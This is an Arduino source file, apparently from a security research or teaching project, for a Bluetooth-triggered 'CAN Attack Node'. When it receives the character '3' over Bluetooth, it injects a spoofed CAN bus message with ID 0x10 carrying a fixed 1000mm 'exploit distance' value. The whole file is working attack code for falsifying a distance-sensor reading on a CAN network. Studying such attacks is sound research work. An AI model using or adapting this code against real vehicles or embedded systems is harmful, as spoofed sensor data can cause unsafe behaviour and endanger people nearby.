/*****************************************
  Authors: Naomi Treto, Sarah Meaney
  Date: 3/3/2025

  Description:
  This program acts as a Bluetooth-controlled sending node on a CAN bus. It listens
  for specific Bluetooth commands and transmits a predefined exploit distance value 
  over the CAN bus upon receiving the appropriate command.

  Features:
  - Bluetooth communication for remote command-based CAN message injection.
  - Periodic CAN message transmission with a predefined exploit distance.
  - Automatic CAN initialization and reinitialization if failure occurs.
  - Hexadecimal data formatting for packet visualization in serial output.
  - Error handling for CAN transmission failures.
  - LED indicator for successful CAN message injection.

  License:
  This program is licensed under the GNU General Public License v3.0.

*****************************************/
#include <SoftwareSerial.h>  // Bluetooth Serial
#include <CAN.h>             // Native CAN library for built-in CAN controllers

// Bluetooth communication pins
SoftwareSerial BT(10, 11); // TX, RX for Bluetooth module

// Constants
const int LED_PIN = 13;                // LED pin for indication
const long CAN_SPEED = 500E3;
const long g_canID = 0x10;              // CAN ID for message
const uint16_t EXPLOIT_DISTANCE = 1000; // Fixed attack distance (1000mm)

// Globals
bool g_canActive = false;

void initCAN();
void sendDistanceOverCAN(uint16_t distance);

void setup() {
  pinMode(LED_PIN, OUTPUT);  // LED pin as output
  digitalWrite(LED_PIN, LOW); // Start with LED off

  BT.begin(9600);      // Start Bluetooth module
  BT.flush();
  BT.println("Hello from Arduino");
  //Serial.begin(115200); // Debugging via Serial Monitor

  BT.println("Bluetooth-CAN Attack Node Ready");
  BT.println("Send '3' to inject CAN distance message (1000mm)");

  initCAN(); // Initialize CAN
  BT.println("After initCAN()");
}

char receivedChar;
void loop() {
  // Check for Bluetooth input
  BT.println("Waiting for input");
  if (BT.available()) {
    receivedChar = BT.read(); // Read Bluetooth input

    if (receivedChar == '3') {
      digitalWrite(LED_PIN, HIGH); // Turn LED ON
      BT.println("Injecting CAN Message...");
      sendDistanceOverCAN(EXPLOIT_DISTANCE);
      BT.println("CAN message sent (1000mm).");
    } else {
      BT.print("Unknown input received: ");
      BT.println(receivedChar);
      BT.println("Send '3' to trigger.");
    }
  }

  // Ensure CAN is always active
  if (!g_canActive) {
    initCAN();
  }
}

void initCAN() {
  if (!CAN.begin(CAN_SPEED)) {
    BT.println("Starting CAN failed!");
    g_canActive = false;
  } else {
    BT.println("CAN started successfully");
    g_canActive = true;
  }
}

void sendDistanceOverCAN(uint16_t distance) {
  byte canData[2] = {0};
  canData[0] = distance & 0xFF;        // LSB of distance
  canData[1] = (distance >> 8) & 0xFF; // MSB of distance

  if (!CAN.beginPacket(g_canID)) {
    BT.println("CAN begin failed");
    g_canActive = false;
  } else {
    CAN.write(canData, 2);
    CAN.endPacket();
    BT.println("CAN packet sent successfully");
    BT.print("Sent Data: [0x");
    BT.print(canData[0], HEX);
    BT.print(", 0x");
    BT.print(canData[1], HEX);
    BT.println("]");
  }
}
